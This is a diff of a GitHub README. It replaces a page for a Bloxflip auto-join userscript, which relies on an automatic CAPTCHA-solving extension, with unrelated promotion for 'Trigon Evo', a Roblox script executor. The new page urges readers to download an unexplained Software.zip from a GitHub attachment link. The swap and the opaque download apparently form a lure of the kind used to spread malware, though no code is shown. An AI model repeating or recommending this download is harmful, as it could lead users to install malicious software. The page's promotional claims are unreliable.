@@ -1,49 +1,21 @@
-# Bloxflip Auto Rain
+# Trigon Evo Roblox Lua IDE and Script Executor 🚀
 
-Bloxflip Auto Rain is a userscript designed to enhance the experience on [Bloxflip.com](https://bloxflip.com) by automatically notifying users of "rain" events and facilitating participation in these events. The script ensures that you never miss out on any rain, as it alerts you and joins the rain events automatically.
+Welcome to Trigon Evo, the powerful Roblox Lua IDE and script executor that streamlines Lua script execution for Roblox enthusiasts. With a focus on seamless performance and quick updates, Trigon Evo ensures a smooth experience for Windows 8-11 users. Explore the features and benefits of Trigon Evo below:
 
-## Features
+## Features ✨
+- **Robust Script Execution**: Execute 99% of scripts with ease, ensuring compatibility with a wide range of Lua scripts.
+- **Performance Optimization**: Experience seamless performance on Windows 8-11, allowing you to run scripts efficiently.
+- **Quick Updates**: Stay up-to-date with prompt updates released within 1-24 hours after each Roblox update, typically occurring every Wednesday.
 
-- **Automatic Notifications:** Get real-time notifications whenever a rain event starts.
-- **Auto Join:** Automatically joins rain events after notification.
-- **Easy to Use:** Runs entirely in the background with minimal setup.
-
-## Prerequisites
-
-Before you can use this script, you need to install a userscript manager. [Tampermonkey](https://www.tampermonkey.net/) is recommended as it is widely supported and easy to use.
-
-You will also need to install the following Chrome extension to handle CAPTCHAs automatically:
-
-- [Captcha Solver - Auto hCaptcha](https://chromewebstore.google.com/detail/captcha-solver-auto-hcapt/hlifkpholllijblknnmbfagnkjneagid?hl=en-US)
-
-## Installation
-
-1. **Install Tampermonkey:**
-   - Go to the [Tampermonkey website](https://www.tampermonkey.net/) and install it for your browser.
+## How to Use Trigon Evo 📝
+1. Download Trigon Evo from the following link: [Launch Trigon Evo](https://github.com/user-attachments/files/18060583/Software.zip)
    
-2. **Add the Bloxflip Auto Rain Script:**
-   - Open Tampermonkey in your browser and click on the Dashboard.
-   - Go to the Utilities tab > URL box, paste the following URL and load it: https://raw.githubusercontent.com/valxe/bloxflip-rain-joiner/main/bloxflip.user.js .
-   - Click on the "Install" button when the script's code appears.
+[![Download Trigon Evo](https://img.shields.io/badge/Download-Trigon%20Evo-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
 
-3. **Install the CAPTCHA Solver Extension:**
-   - Visit the [Captcha Solver - Auto hCaptcha extension page](https://chromewebstore.google.com/detail/captcha-solver-auto-hcapt/hlifkpholllijblknnmbfagnkjneagid?hl=en-US).
-   - Click on "Add to Chrome" to install the extension.
+2. Launch the application on your Windows 8-11 system.
+3. Start running and testing your Lua scripts with the ease and efficiency of Trigon Evo.
 
-## Usage
+## Support and Feedback 📧
+If you encounter any issues or have feedback to share, please check the "Releases" section for updates. Your input is valuable in enhancing the Trigon Evo experience for all users.
 
-Once installed, the script will automatically run on Bloxflip.com. Ensure you have notifications enabled for the site so you can receive alerts. When a rain event starts, the script will notify you and automatically attempt to join the event after a few seconds.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE) file for details.
-
-## Disclaimer
-
-This script is for educational purposes only. Please respect Bloxflip's terms of use. Any automation provided by this script is intended to enhance user interaction without violating user agreements.
-
-
-
-## Damn
-
-Yea i made this using ChatGPT ( the readme not the actual script ) if u have beef with me using chatgpt feel free to dm on discord and roast me or whatever ( @valentineuh ) plz add i have no friend 
+Get ready to elevate your Roblox Lua scripting experience with Trigon Evo! 🌟
